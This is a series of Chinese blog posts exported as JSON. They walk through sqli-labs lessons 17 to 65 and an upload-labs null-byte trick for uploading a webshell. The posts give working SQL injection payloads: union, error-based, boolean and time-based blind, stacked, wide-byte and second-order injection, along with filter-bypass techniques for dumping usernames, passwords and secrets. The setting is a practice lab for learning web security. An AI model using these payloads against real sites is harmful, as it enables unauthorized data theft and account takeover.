加上webshell.php，然后点开Hex，将webshell.php后面的20改为00，如果找不到20，那么就在raw的webshell.php后面加个空格","tags":[{"name":"upload-labs","slug":"upload-labs","permalink":"http://example.com/tags/upload-labs/"}]},{"title":"lesson54-65","date":"2021-02-08T15:57:12.000Z","path":"2021/02/08/lesson54-65/","text":"lesson54：我们通过查看蓝字可以大致明白这关的意思：输入payload的次数小等于十次的情况下获得数据库秘钥，如果超过十次那么表名，列名还有秘钥就会重新刷新。 试探注入类型：?id=1’，页面错误，但是没有回显错误信息 ?id=1’ and ‘1’=’1，登入成功，回显用户名和密码 ?id=1’ and ‘1’=’2，页面错误 因此我们可知存在sql注入点，且为单引号型。 因为我们知道了库名，我们就无需再爆库了。 爆表：?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’challenges’ –+ 爆列：?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xfih974sor ‘–+ 爆值：?id=-1’ union select 1,2,group_concat(secret_2W57) from challenges.xfih974sor–+ 然后我们把得到的值输入，submit即可。 最后查看源码，发现PHP对输入的key做了过滤处理，也就是说我们想从key一栏进行注入还是比较困难的。 lesson55：同lesson54，不过注入类型改为了)。 lesson56：同lesson54，不过注入类型改为了&#39;)。 lesson57:同lesson54，不过注入类型改为了&quot;。 lesson58:执行 sql 语句后，并没有返回数据库当中的数据，所以我们这里不能使用 union 联合注入， 这里使用报错注入或者延时注入。 lesson59：同lesson58，注入类型变为数字型。 lesson60：同lesson58，注入类型变为&quot;)。 lesson61：同lesson58，注入类型变为&#39;)) lesson62:sql语法错误时不会回显报错，那么报错注入也没法用了，只能延时注入。 lesson63、64、65：同lesson62，仅改变注入类型。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson46-53","date":"2021-02-07T10:56:07.000Z","path":"2021/02/07/lesson46-53/","text":"background——Order by后的注入： 查看mysql官方select的文档： 由于order by 后面只能接(字段名，表达式，位置)等信息，我们并不能向原来一样使用联合查询。 查看lesson46的源码： 12345678$id=$_GET[&#x27;sort&#x27;]; if(isset($id)) &#123; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\\n&quot;); fclose($fp);$sql = &quot;SELECT * FROM users ORDER BY $id&quot;; 我们看到这关我们的输入应该是?sort=，而不再是?id=。我们输入?sort=1，即对第一列进行升序排序，且参数值要小等于列数，否则会报错（如有一个表有三列，?sort=4，页面就会报错）。 lesson46：我们查看源码可知这是数字型注入，那么我们怎么判断是否存在order by后的注入呢？我们可以通过对比输入?sort=1 desc和?sort=1 asc（desc降序，asc升序）的返回页面来判断是否存在order by后的注入——若两者返回值不同，则说明存在order by后的注入。 这关的payload句式有三种： ?sort=(select ······) ?sort=1 and (select ······) ?sort=rand(······) 注：句式(1)和(2)没有本质上的区别。 解法一.报错注入：爆库：?sort=1 and updatexml(1,concat(‘~’, database()),1) 爆表：?sort=1 and updatexml(1,concat(‘~’,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)),1) 爆列：?sort=1 and updatexml(1,concat(‘~’,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’security’)),1) 爆值：?sort=1 and updatexml(1,concat(‘~’,(select * from (select concat_ws(‘ ‘,id,username,password) from users limit 0,1) x)),1) 注：这边不知道为什么&#39;#&#39;不能用了，找了半天原因。 解法二.布尔盲注：SQL 像 PHP，也是一种弱类型，它会认为true=1，false=0。用在order by后会直接导致显示不同： A: B: C: 通过对比A,C我们可以发现，order by后接返回数字或布尔值（因为是弱类型，布尔值返回仍是数字）的语句是没有作用的！也就是说我们无法使用句式一、二进行布尔盲注，那么我们能不能使用句式三进行布尔盲注呢？ 我们先输入：?sort=rand(true) 再输入：?sort=rand(false) 我们可以看到两种得到的返回不同，那么就说明我们可以利用句式三来进行布尔盲注。 Q:其实这边有一个疑问，不是说order by后接的数字不起作用吗，为什么rand函数的返回值也是数字，但是却可以起作用呢？我突然有个猜想——order by后接字符、字符串或布尔值是不起作用的，也就是说数据库返回值不会根据字符串的不同而不同，如果是这样就可以理解为什么了,可是在我用时间盲注解这关的时候if函数返回值是1但是页面返回却和?sort=1的不同。我蒙了，算了，挖个坑吧！！！！！！！！！！！！！！！！！ 我们的布尔盲注思路是这样的：?sort=rand（sql语句），如果sql语句正确，那么页面的返回会和?sort=rand(true)一样（利用了rand函数的伪随机性），反之和?sort=rand(false)一样。 sp：rand()函数是个随机函数，返回0~1间的小数。使用时也可以给定参数值（随机种子），相同的参数生成的结果也相同（伪随机性）。 爆库：?sort=rand(left(database(),8)=’security’) 我们看到页面返回与?sort=rand(true)的一样，说明数据库名就是security。 后续的爆表，爆列等也是这样，构造payload然后比对页面返回得结果。不多赘述。 解法三.时间盲注：时间注入可以利用句式一或者句式二。在这里我们就简单的拿爆库举个例子，剩下的参考时间盲注那一关的笔记。 爆库：?sort=if(mid(database(),1,8)=’security’,1,sleep(5)) lesson47：和lesson46一样，注意注入类型的变化做出适当改变（包括句式的改变还有添加注释符等）即可。 lesson48：同lesson46，但是页面不再出现报错回显，故报错注入不可用。 lesson49：同lesson47，但是页面不再出现报错回显，故报错注入不可用。 lesson50、51、52 、53：就是之前学的堆叠注入加上新学的order by后的注入，没什么新颖的，打组合拳就好了。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson38-45","date":"2021-02-06T14:44:20.000Z","path":"2021/02/06/lesson38-45/","text":"background——堆叠注入：在 SQL 中，;(分号)是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。但对于不同数据库（mysql，sqlserver，oracle等）来说，除oracle不允许外，其他数据库我们可以在一条sql语句后紧接着构造下一条sql语句。 这里可能会有一个问题——union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？(1)区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句。 (2)堆叠注入不会像联合注入那样受第一句sql语句影响。我们知道联合注入要满足第一句sql语句错误的条件下才会执行后面我们构造的sql语句，而堆叠注入没有这个问题。 (3)在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果时只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用 union（联合）注入。例以lesson38的一个payload为例：?id=0’ union select 1,2,database();create table test like users–+这样我们可以前台获取数据信息，后台篡改数据信息，实现“双管齐下”。 sp：关于数据库的一些增删改查在另一篇博客已经专门介绍了，这里不多赘述。 lesson38：认识一下新函数： mysqli_connect()函数：功能：打开一个到 MySQL 服务器的新的连接。语法：mysqli_connect(host,username,password,dbname,port,socket)； mysqli_select_db()函数：作用：用于更改连接的默认数据库。语法：mysqli_select_db(connection,dbname) mysqli_multi_query()函数：语法：mysqli_multi_query(connection,query)； 功能：执行一个或多个针对数据库的查询。多个查询用分号进行分隔。 注：这个函数是可实现堆叠注入的重要因素！ mysql_store_result()函数：功能：用于将mysqli_query()查询的结果集存储到变量中 mysqli_more_results()函数：语法：mysqli_more_results(connection);参数：connection——必需。规定要使用的mysql连接功能：检查一个多查询是否有更多的结果。 mysqli_fetch_row() 函数： 语法：mysqli_fetch_row(result)； 参数：result——必须。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果 集标识符。 功能：从结果集中取得一行，并作为枚举数组返回。 lesson39&amp;40&amp;41：就改变了id闭合方式，注意注入类型变化即可，其余与lesson38一致。 lesson42：这关可以用二阶注入，但是没必要，因为我们输入的密码没有被过滤，我们可以用报错注入，延时注入。或者用我们新学的堆叠注入。 在我们使用堆叠注入时虽然页面返回错误，但是我们在数据库中查找，还是可以看到我们的payload执行l。 lesson43&amp;44&amp;45：就改变了id闭合方式，注意注入类型变化即可，其余与lesson42一致。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson32-37","date":"2021-02-06T05:17:38.000Z","path":"2021/02/06/lesson32-37/","text":"background——宽字节注入： 原理：mysql在使用GBK编码的时候，会认为两个字符（前一个字符的ascii码必须大于128才能到汉字的范围）。）为一个汉字，例如%aa%5c就是一个汉字。 以lesson32为例，查看源码发现PHP会对\\（反斜杠）,&#39;（单引号）,&quot;（双引号）做转义处理 12345678910111213141516171819202122232425262728function check_addslashes($string)&#123; $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace(&#x27;/\\&#x27;/i&#x27;, &#x27;\\\\\\&#x27;&#x27;, $string); //escape single quote with a backslash $string = preg_replace(&#x27;/\\&quot;/&#x27;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string;&#125;// take the variables if(isset($_GET[&#x27;id&#x27;]))&#123;$id=check_addslashes($_GET[&#x27;id&#x27;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);//!对于源码的解读：我认为24-26行的命令目的是将sql语句用gbk编码，以防带入数据库后乱码。$row = mysql_fetch_array($result); 那么我们利用它会将sql语句转为gbk编码，通过吞并\\（url编码%5c）的方式绕开其对单引号的转义。例如：%aa%5c，这在gbk编译后成为一个汉字。（gbk编码表https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php）比如 乗 字符，GBK编码 %81%5C 补充：有些符号（# $ ^ &amp; * + =）在URL中是不能直接传递的，如果要在URL中传递这些特殊符号，那么就要使用他们的编码了。编码的格式为：%加字符的ASCII码，即一个百分号%，后面跟对应字符的ASCII（16进制）码值。（URL编码就是在uft-8编码的基础上，给编码的每个字节加上百分号。） lesson32：爆库：payload： 1?id&#x3D;%aa&#39; union select 1,2,database()--+ 爆表：payload: 1?id&#x3D;%aa&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+ 注：爆表本应该是?id=%aa’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+ 但是因为PHP对&#39;转义，那么我们可以用十六进制来表示security 爆列：payload: 1?id&#x3D;%aa&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;0x7365637572697479--+ 爆值：payload: 1?id&#x3D;%aa&#39; union select 1,2,group_concat(username,0x2c,password) from users--+ lesson33：和lesson32一模一样。 lesson34：这关我还以为会和之前两关一样，只不过改为post类型，结果发现了一些不同。 当我在username输入admin%aa’ union select 1,database()#，登入失败，按理来说不应该呀。于是我用burpsuite抓包： 我们明明输入的uname=admin%aa’ union select 1,database()#，可是我们看到多了一个25在%aa中间，这是什么情况呢？原来，get与post提交数据类型不同，get型如果输入符合url的格式那么就直接以url形式提交，也就是说遇到%aa这种直接当做url编码处理，而post型却不是这样，他会把你提交的%aa当做正常数据，然后进行url编码，于是就变成了%25aa。 那么我们要怎么避免这个问题呢? 我们可以用burp抓包，手动去掉25 补充：不同类型编码 UTF-16编码：一个英文字母字符或一个汉字字符存储都需要2个字节（Unicode扩展区的一些汉字存储需要4个字节）。UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节Unicode编码：一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。 —）我们还可以用另外一种方式：?id=牛’ or 1=1# 在经过url编码后，牛被编码成三个字节加上单引号一个字节，再加上单引号被转义后反斜杠一个字节，总共五个字节，我们已经知道gbk编码时两个字节为一汉字，那么这样转义单引号用的反斜杠被合并，单引号“逃逸”成功。 https://www.qqxiuzi.cn/bianma/Unicode-UTF.php在线Unicode和UTF编码转换网址 lesson35：没营养 lesson36：和lesson32一样，只不过把过滤函数改成mysql_real_escape_string（）。 lesson37：和lesson34一样，只不过把过滤函数改成mysql_real_escape_string（）。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson29-31","date":"2021-02-05T08:14:01.000Z","path":"2021/02/05/lesson29-31/","text":"background：首先，我们先来了解一下什么是web应用的基本架构： lesson29这关中，服务端web应用有两个，一个是以tomcat为引擎的jsp型服务器，一个是以apache为引擎的php型服务器： 打开indexjsp查看源码： 方框内执行的是判断tomcat获取的id是否为纯数字。 接着，如果id是纯数字，它“确认安全”，就会把输入传递给apache服务器。 这过程中tomcat的作用就相当于一道waf（防火墙）。那么我们怎么绕过这个防火墙呢？ 悉知，大多数服务器对参数的解析： 也就是说，当遇到多个参数时，tomcat只会获取第一个参数，对其进行上述处理，只要第一个参数复合它的要求，tomcat就会把我们的输入传递到下一级。因此我们可以利用这一特点，构造多个参数来达到目的。 lesson29：爆库：payload： 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,database()--+ 爆表：payload: 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+ 爆列：payload: 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39;--+ 爆值：payload: 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(username,0x3a,password) from users--+ lesson30：注入类型：&quot; ，其余一样。 lesson31：注入类型：&quot;) ，其余一样。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson25-28a","date":"2021-02-04T08:26:27.000Z","path":"2021/02/04/lesson25-28a/","text":"lesson25：这一关它告诉我们and和or都被过滤了。 一般，绕开过滤的方法有以下几种： （1）大小写变形 Or,OR,oR （2）编码，hex，urlencode （3）添加注释/or/ （4）利用符号 and=&amp;&amp;，or=|| （5）构造字符串——oorr，anandd 我们查看源码： 这里的or和and采用了i正则匹配，大小写都无法绕过。 { 拓展一下PHP正则表达式的模式修饰符 i ​ 如果设定此修正符，模式中的字符将同时匹配大小写字母。 m当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。 s如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。 x如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的 #以及下一个换行符之间的所有字符，包括两头，也都被忽略。 } 那么这关我们就以双写绕过的方式为例。 查看源码： 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;; 从中得知这关为单引号类型注入。 当输入?id=1时，页面有回显。那么我们可以采用union联合注入。 爆库:输入：?id=0’ union select 1,2,database()–+ 得， 爆表：输入：?id=0’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’–+ 得， 注：information中也含有or，因此也需要做绕过处理。 爆列：输入：?id=0’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=’security’–+ 得， 爆值：输入：?id=0’ union select 1,2,group_concat(username,0x3a,passwoorrd) from users–+ 得， 注：password中也含有or，因此也需要做绕过处理。 lesson25a:和lesson25没什么区别，注意注入类型就好了。 lesson26：查看源码： 我们可以看到它就过滤了一堆字符。此时，我们可以采用URL编码绕过这些过滤： + URL 中+号表示空格 %2B空格 URL中的空格可以用+号或者编码 %20/ 分隔目录和子目录 %2F? 分隔实际的URL和参数 %3F% 指定特殊字符 %25# 表示书签 %23&amp; URL 中指定的参数间的分隔符 %26= URL 中指定参数的值 %3D 我不知道为什么空格我一直找不到绕开的方法，上面的几种都不行，好像是apache的问题，要我们用linux系统才能绕过。既然这样我们只能避免输入空格了，使用报错注入—— 爆库：输入：?id=1’||updatexml(1,concat(‘~’,database()),1)||’1’=’1 得， 爆表：输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1 得， 爆列：输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’anandd(table_schema=’security’)))),1)||’1’=’1 得， 爆值：输入：?id=1’||updatexml(1, concat(0x7e,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from(security.users))) ,1)||’1’=’1 得， 这里有一个问题，limit因为过滤因素用不了，很难受，而且报错长度又有限，那么这时我们可以通过控制id的值来一个个查询，例如输入：?id=1’ || updatexml(1, concat(0x7e, (select (group_concat( concat_ws(0x7e,username,passwoorrd) )) from (security.users) where(id=5))) ,1) || ‘1’=’1 lesson26a：当我们输入导致sql语法错误的时候，不会回显，那么我们就无法使用报错注入了。 lesson27：同lesson26，报错注入。 源码： 若想使用union联合注入，只需要将 union 和 select 改为大小写混合就可以了。 这关取消了对and和or的过滤。 lesson27a：不能使用报错注入。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson24","date":"2021-02-03T13:07:57.000Z","path":"2021/02/03/lesson24/","text":"lesson24：这关感觉很有意思。以往的SQL注入都是一阶注入，而这一关出现了二阶注入。先介绍一下二阶注入： 二阶注入也叫存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就会触发sql 注入。 我们先在页面上做一些试探。 点击：Forgot your password？ 页面跳转： 大意是如果你忘了你的密码，就自己黑了他。那么我们肯定不能在这里下手了。 点击：New User click here? 页面跳转： 我们看到这就是一个普通的注册界面，有什么用呢，我们先暂不言表。 我们接着试探，输入正确账号密码，进入到一个修改密码的网页： 不知道哪个地方可以注入，我们先打开login的源码： 发现登入页面输入的账号密码都被转义了，那么肯定不能直接注入，接着看代码： 1$_SESSION[&quot;username&quot;] = $login; 发现它设了一个新变量储存从数据库中选择出来的username的值。 打开pass_change的源码： 我们可以看出从改密码的页面注入是不可行的了，但是我们发现从数据库中选择出来的username没有被复查，直接构造成sql语句，带入到数据库中。于是我们就可以有这样一种思路，我们先注册一个账号，例如：账户：admin’#（admin为目标用户名），密码：123。 然后我们输入我们注册的这个账号密码登入，进入修改密码页面， pass_change的源码中sql语句是： 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 而登入我们注册的账户后，sql语句被篡改为： 123$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;相当于：$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;&quot;; 也就是说，我们达到了无需知道目标账户密码而可以修改目标账户的密码，进而通过修改的新密码登入目标账户。 但是这里有个问题：我们输入的单引号不是被转义了吗，那它构造的sql语句怎么还会起作用呢？ 原来转义只是暂时的，数据存储到数据库以后还是以原句的形式存在，反斜杠不会随之插入数据库。 注：我发现这样注入还是很有局限性的，因为你只能一个一个去破解，如果通过注册账户时构造payload，会受到字节长度的限制。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson23","date":"2021-02-03T10:52:07.000Z","path":"2021/02/03/lesson23/","text":"lesson23：这关又变回了get请求类型。 在url行输入：?id=1, 发现有回显。 输入：?id=1’，报sql语法错误； 输入：?id=1’ or ‘1’=’1 ，登入成功； 输入：?id=1’ and ‘1’=’2 ，登入失败。因此确定为单引号类型注入。 因为有回显，那么接下来使用联合注入就可以了，详情参考lesson1，不再赘述。 但是有一个点值得注意，就是我在构造payload语句时，我发现我若以 &#39;--+&#39; 或者 # 结尾则页面返回sql语法错误，于是我查看源码： 12345$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); 介绍一下preg_replace()函数： 因此我们得知 &#39;--+&#39; 和 # 都被屏蔽掉了，那么我们要怎么闭合sql语句呢？ 1.union注入时以爆库为例：?id=-1’ union select 1,database(),’3 ​ 或：?id=-1’ union select 1,database(),3 or ‘1’=’ 2.报错注入时以爆库为例：?id=-1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) or ‘1’=’ ​","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson21-22","date":"2021-02-03T03:45:46.000Z","path":"2021/02/03/lesson21-22/","text":"这关虽然和lesson18很像，但是还是有很多东西值得开一篇新的blog。 lesson21：首先输入正确的用户名，密码，用burp抓包： 我们看到cookie一行的uname=被加密了，我们查看源码： 1setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()+3600); sp：介绍一下setcookie（）函数： setcookie() 函数向客户端发送一个 HTTP cookie。 cookie 是由服务器发送到浏览器的变量。cookie 通常是服务器嵌入到用户计算机中的小文本文件。每当同一台计算机通过浏览器请求页面时，就会发送这个 cookie。 cookie 的名称自动指定为相同名称的变量。例如，如果被发送的 cookie 名为 “user”，则会自动创建一个名为 $user 的变量，包含 cookie 的值。 必须在任何其他输出发送到客户端前对 cookie 进行赋值。 如果成功，该函数返回 TRUE。如果失败则返回 FALSE。 因此我们可以看到cookie的值被加密了。接着看源码： 至此，我们可以确信还是从cookie进行注入，不过要将payload进行base64加密。 在线编译网站：https://tool.oschina.net/encrypt?type=3 那么开始注入吧！ 法1：报错注入，类似于lesson18，不过多赘述了，构造payload然后在网站上加密，再添加到cookie上。 法2：union联合注入，因为当我们输入正确的账号密码的时候，我们可以看到页面有回显。因此我们可以通过order by函数来查字节。剩下的就是以前学的内容了，不再赘述。 lesson22：这一关和lesson21差不多，就是注入类型变成了双引号，其余一致。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"HTTP协议","date":"2021-02-02T14:56:16.000Z","path":"2021/02/02/HTTP协议/","text":"","tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://example.com/tags/HTTP/"}]},{"title":"lesson18-20","date":"2021-02-01T12:33:49.000Z","path":"2021/02/01/lesson18-20/","text":"lesson18：这一题看过去和lesson17没什么差别，就多了一行id地址，我们查看源码： 12$uname = check_input($_POST[&#x27;uname&#x27;]);$passwd = check_input($_POST[&#x27;passwd&#x27;]); 可知，数据库对输入的username和password都做了过滤，所以我们想通过页面输入获取数据库信息的方法肯定是走不通了。我们再看源码： 12$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; 源码使用HTTP_USER_AGENT只获取了HTTP请求头的一个部分: User-Agent 。而获取IP则使用了RENOTE_ADDR，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但修改XFF头就可以更改的。我们继续往下看： 1$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; 从这里我们可以看到我们的uagent等会被带入到数据库中，那么我们好像可以通过对uagent进行改写，构造payload。 然后我们现在在页面输入正确账号密码后，发现页面回显： 那么我们更可以确定是对User-Agent 下手。 通过第三段源码我们可以得知注入类型为：’ ; 于是我们可以开始用burp suite抓包： payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#其中clase为想要查询的子句；源码的insert语句中原本有三个参数（用三个1表示）——（1，1*，1**），然后1被&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) 替换，后面1*和1**是为了和insert语句中参数数量一致，否则会报错： 当updatexml函数报错以后，数据库就不会去检查1*和1**了。 注：&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) 带入到源码中 &#39;&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1)，第一处合并是空，所以uagent把updatexml函数的值带入数据库。 爆库：网页输入正确账号密码，burp抓包，在User-Agent一行构造payload： 1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select database()),&#x27;#&#x27;),1),1,1)# Forword，得： 爆表：网页输入正确账号密码，burp抓包，在User-Agent一行构造payload： 1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)# Forword，得： 注：因为我之前在security数据库里创了表，现在导致表太多了，而报错的长度有限，不能查到所有表。然后我想用limit函数限制查询数量，但是我尝试了好久没有成功，先留个坑吧！！！！！！！！！！！！！！！！！！ 爆列：网页输入正确账号密码，burp抓包，在User-Agent一行构造payload： 1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)# Forword，得： 爆值：网页输入正确账号密码，burp抓包，在User-Agent一行构造payload： 12&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select * from (select concat_ws(&#x27; &#x27;,id,username,password) from users limit 0,1) x),&#x27;#&#x27;),1),1,1)# Forword，得： lesson19：这一关和lesson18差不多，只不过改在Referer处写payload。 lesson20：这一关和lesson18也是类似，不过在cookie处写payload，而且因为当输入正确账号密码的时候，网页会回显，所以也可以采用union联合注入。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson17","date":"2021-01-31T13:26:30.000Z","path":"2021/01/31/lesson17/","text":"lesson17：这一关不管我们在username上构造什么payload都无法篡改数据库。 我们查看源码： 1234567891011121314151617181920212223242526function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 先认识一下陌生函数：1.get_magic_quotes_gpc()函数get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。 注：开启magic_quotes_gpc=on之后，能实现addsIshes()和stripslashes()这两个函数的功能。在PHP4.0及以上的版本中，该选项默认情况下是开启的，所以在PHP4.0及以上的版本中，就算PHP程序中的参数没有进行过滤，PHP系统也会对每一个通过GET、POST、COOKIE方式传递的变量自动转换，换句话说，输入的注入攻击代码将会全部被转换，将给攻击者带来非常大的困难。 2.addslashes()函数addslashes()函数将输入数据中的预定义字符（单引号、双引号、反斜杠和NULL(空字符)）之前添加反斜杠\\的字符串。 3.stripslashes()函数stripslashes(string)函数删除由addslashes()函数添加的反斜杠。 注意：当magic_quotes_gpc打开时，所有的单引号、双引号、反斜杠和NULL(空字符)会自动转为含有反斜杠的溢出字符（PHP对所有的GET、POST和COOKIE数据自动运行addslashes()）。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。 4.ctype_digit()函数ctype_digit()函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。 5.mysql_real_escape_string()函数转义 SQL 语句中使用的字符串中的特殊字符： sp：怎么理解这个转义呢？举个例子，PHP把输入数据中的单引号转义了（单引号前加了个反斜杠）变成字符串一部分，那么输入数据代入数据库sql语句时，这个转义后的单引号就无法作为字符与数据库sql语句中本来存在的单引号合并，所以无法篡改sql语句。 我们观察源码： 1234567$uname=check_input($_POST[&#x27;uname&#x27;]); $passwd=$_POST[&#x27;passwd&#x27;];......$update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; 由于数据库中对输入的username一顿操作，那么从username下手肯定吃不了兜着走，所以转变思路可以从password下手。 输入username=root ；password=root’，页面报sql语法错误，确定注入点为：’ ; ！这里介绍一个注入方法： 报错注入：A.常用函数：1.updatexml()函数：updatexml(xml_doc,xpath,new_value)函数有三个参数，分别是(xml_document, XPath_string, new_value)—- 第一个参数：xml_document， String格式，为XML文档对象的名称； 第二个参数：XPath_string (Xpath格式的字符串)； 第三个参数：new_value， String格式，替换查找到的符合条件的数据； 该函数的作用就是把xml文档中的指定字符串替换成新值。 2.extractvalue()函数：extractvalue(xml_doc, xpath)函数作用是从指定xml文档中查询指定的字符串。 B.报错注入原理：(1)参数xpath需要的是xpath格式的字符串，不是就会报错。 (2))当xpath路径语法错误时，就会报错。 注：报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断。 懂得了以上知识就可以开始注入了。因为两种函数的注入方法大相径庭，所以下面我就举updatexml为例解题。 爆库：输入： 12username=rootpassword=(anything)&#x27; or 